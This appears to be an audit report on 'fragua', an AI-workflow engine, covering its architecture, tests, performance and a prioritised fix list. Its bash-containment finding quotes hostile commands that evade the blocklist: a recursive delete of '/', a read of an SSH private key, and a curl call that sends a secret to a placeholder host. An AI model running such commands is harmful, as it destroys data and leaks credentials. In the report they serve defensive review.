# Assessment

**fragua** is a durable AI-workflow execution engine — YAML workflows compiled to a deterministic state machine driving LLM agents over any provider, all folded from a single append-only SQLite event log. **Verdict: a principled, invariant-heavy design that is faithfully realised in the hot path but frays at the edges — the security containment story around `bash`, the read/control surface, and a family of discipline lints that enforce membership rather than reachability.** Baseline is green across the board: `tsc --noEmit` exit 0 for all 10 packages, `biome check` exit 0, `test:node` 3645 pass / 0 fail (94k assertions), `test:web` 725 pass / 0 fail. No claim across the five lenses was refuted; every deviation resolved to doc drift or a scoped-but-real defect.

## Scores

| Axis | Score | What drove it |
|---|---|---|
| simple | 7 | Clean plane/invariant architecture, but monolith hot spots: `store.ts` ~100-method god class (2632 lines), `backend.ts` mixes the swap surface with classifiers/scanners (1553 lines), and OCC-conflict boilerplate is hand-duplicated across ~9 commit arms. |
| testable | 8 | Pure injectable decision core, high test:src ratios (daemon 2.67×), extensive discipline lints — but the lints have coverage holes (property-matrix gate sentinel-pins only 12 of 42 invariants; a gutted test file survives on path-existsSync alone). |
| observable | 8 | Event log is truth, observability buffer + snapshots + SSE cursors all present; docked because `run_state.title` is a projection column written with no backing event, so replay/import cannot reconstruct it. |
| flexible | 7 | Swap surface, provider abstraction, planes shared by both clients — but "swap surface is one file" is overstated (the SDK is imported by ~10 files across 3 packages) and MCP reconnects on every node dispatch, penalising reuse on looping nodes. |
| efficient | 6 | O(1) seq, single-writer OCC contention-free, content-addressed blobs — undercut by unbounded full-event-log scans on the interactive control path (`POST /runs/:id/human`, uncapped read endpoints) and a synchronous `existsSync` per run-detail read. |

## Do now

1. **Harden `bash` containment — non-provider secrets leak into agent shells.** *(high / verified)* `local-env.ts exec()` merges `{...process.env, ...opts.env}` and only strips provider credentials via `daemon.ts resolveRunEnvDeny`; `blocklist.ts` has exactly 7 regexes (evaded by `python3 -c "shutil.rmtree('/')"`, base64-decode-exec, `$RM` indirection); `resolvePath()` gates read/write/edit and `exec` cwd but **not** the command body, so `cat ~/.ssh/id_rsa` and `curl https://x?d=$(cat secret)` succeed. **Fix:** flip env handling to deny-by-default with an explicit `bash.env-passthrough` allow-list, and document `bash` as arbitrary code execution rather than a containment boundary.
2. **Bound the unbounded event-log scan in the human-input write path.** *(medium / verified)* `routes.ts POST /runs/:id/human` calls `deps.store.getEvents(runId)` — the entire run log — then iterates backward in JS to find the latest `fact.run_paused{reason:'human'}` on every interactive request. **Fix:** add a read-plane projection that returns the current pause routes directly (bounded query), and route the handler through it.
3. **Hoist synchronous filesystem I/O out of the run-detail projection.** *(medium / verified)* `projections.ts runStateToDetail` calls `existsSync(join(state.cwd,'.fragua','worktrees',state.runId))` (lines ~164–168) on every `runDetail()` read — a blocking syscall per SSE-driven refetch that also stats the wrong host's path for imported bundles. **Fix:** resolve `worktreePath` at the caller (which already touches the FS) or store it on the projection; keep the read plane pure.
4. **Move fan-out fact-selection into a pure planner.** *(medium / verified)* `fanout.ts fanoutBudgetDisposition` (line 319), `settleBranch` (~404), `seedFrontier` construct `fact.run_*` inline inside the I/O driver, while the linear path delegates all fact-selection to `predispatch-planner`/`transition-planner`/`abort-planner`. **Fix:** extract branch fact-selection into `fanout-planner.ts` (already the scanned-for-purity module) and have the driver only commit, restoring symmetry with the linear path.
5. **Fix the outer crash-catch that can strand a run in `running`.** *(medium / inferred)* `executor.ts runOne`'s belt-and-suspenders catch calls `await tryAppendFact(...)` and rethrows without checking the returned OCC boolean; recovery then depends solely on the next daemon restart's `startupSweep`. **Fix:** inspect the append result, and on OCC failure re-read and retry (or escalate to `occ_exhausted`) in-process rather than leaving the row stuck until restart.

## Patterns

- **Discipline lints enforce membership, not reachability.** The lint suite is a real strength but has a recurring blind spot — each lint scans a directory or a method-name set instead of the import/call graph, so a helper one hop away escapes. Instances: I1 no-serialization lint skips `sweep.ts`'s SAVEPOINT closures and is bypassable via a second-level or cross-file helper (`store/test/lint.test.ts`); handler-discipline scans `handler/handlers/` by directory, so a `handler/`-root helper importing `node:*` slips through (`core/test/handler/discipline.test.ts`); read paths bypass the read plane with no lint covering reads (`routes.ts` `getState`/`getEvents`/`listProjects`/`getGlobalMetricsTotals`); `NodeType`↔`KNOWN_TYPES` are hand-synced with no exhaustiveness check; the property-matrix gate sentinel-pins only 12 of 42 invariants (the other 30 survive on `existsSync(ownerFile)`).
- **Monolithic modules and driver functions.** `store.ts` (~100 public methods, 2632 lines), `backend.ts` (1553 lines mixing `PiLlmBackend` with independently-testable classifiers/scanners), `transition-planner.ts` (1271 lines), `dispatchHandler` (~127 lines carrying a ~35-line inline budget closure that sets fact-influencing scope vars read later by `commitAbort`).
- **Hand-duplicated OCC / commit boilerplate.** The `if (!ok) { onConflict → halted ? terminal : continue }` pattern is open-coded at `commitCancel`/`commitPause`/`startRun`/`commitDispatchMarker`/`commitAbort` in `dispatch-turn.ts` and again in `settleBranch`/`seedFrontier`/`advanceJoin` in `fanout.ts`.
- **Read/control surface is unbounded and loosely validated.** Full-log scan in `POST /runs/:id/human`; uncapped `GET /runs/:id/events.json` and `/steps`; synchronous `existsSync` per run-detail read; numeric query params (`since`, `limit`, `windowHours`) parsed with bare `Number()` and reach downstream calls as `NaN`, while `runs-routes.ts` uses a `Number.isFinite` guard — inconsistent within the same server.
- **Security surface wider than the docs frame it.** `bash` full-FS/network/non-provider-env reach; blocklist trivially evaded; TOCTOU between check-time `realpath` and use-time direct `fsReadFile` in the read tool; the same-origin gate only blocks bodied writes so cross-origin *reads* rely on browser CORS, not the gate; judge `state:`/`for-each:` substitution feeds a System-One LLM without the prompt-injection delimiting the `llm` path applies.

## What held up

Every store invariant I1–I10 verified in code (byte-exact pre-lock guards for routing/payload/message caps with schema CHECK backstops; O(1) `next_seq` bump; file-then-row content-addressed artifacts with collision semantics). OCC double-check + `ConcurrencyError`, startup sweep (SAVEPOINT-per-run, crash requeue preserving `current_node`, orphan quarantine, paused/quarantined untouched), migrations with `down` inverses and irreversible/lossy refusal, reducer purity folding the full `[1,6]` range with LEGACY arms retained, six-way `IEventStore` segregation, SQL-in-`*-queries.ts` placement, enum-consumer lints, and broad blob-GC roots (routing **and** output-struct shas) all confirmed. Daemon: pure decision core, `runOne` turn loop, contract-version gate, intent fold R1–R7, `AbortSignal.any` composition, `CommittingRecorder` pre-commit, timeout/abort-loop/provider-retry policies, wake-pending sweeper, single-lane fan-out commits, snapshots. Core: browser-safe entry (transitive graph walk), two-case edge selection, single-pass substitution (lenient inputs / fail-closed outputs / injection wrapping), validator codes, both planes, eight routing accessors, five retry presets, YAML `start`/`exit` handling, four-arm `HandlerResult`, judge. Agent/workspace: force-included tools, three-layer read-only enforcement, provider error classification, steering broadcast + buffer-clear-on-empty, verbatim credential storage, run-actions git with folded state gate, skill discovery, MCP lifecycle, worktree provisioning. Surface: loopback bind + same-origin gate, body validation before intent, enqueue preflights (inputs/provider/backpressure), SSE seq cursors, `server_endpoint` discovery, inline-import lint, CLI-as-store-client, shared `buildExecutorDeps`, harness supervision, workflow resolution, config cascade, `db migrate --to` double-liveness gate, the React 18/Vite 5/Tailwind 4 stack, web's HTTP-only boundary, DTO widening, and the bun/vitest runner split.

## Critical path

1. **Read-discipline lint + I1 sweep coverage** — gates step 2: the guardrail must exist before the read-path refactor so the change is enforced and cannot silently regress into new raw-store reads.
2. **Read-path remediation** (route reads through the plane, hoist `existsSync`, bound the `/human` scan, validate numeric params) — gated by step 1; stabilises the read/control surface before executor work lands.
3. **Crash-catch OCC recovery fix** — gates step 4: it touches the same executor OCC commit code the fan-out refactor rewrites, so it must settle first to avoid rebase churn.
4. **Fan-out pure-planner extraction + OCC-boilerplate dedupe** — gated by step 3; restores linear/fan-out symmetry once the commit paths are stable.
5. **`bash` containment hardening** — terminal; independent security work that gates nothing but should not be deferred given its severity.
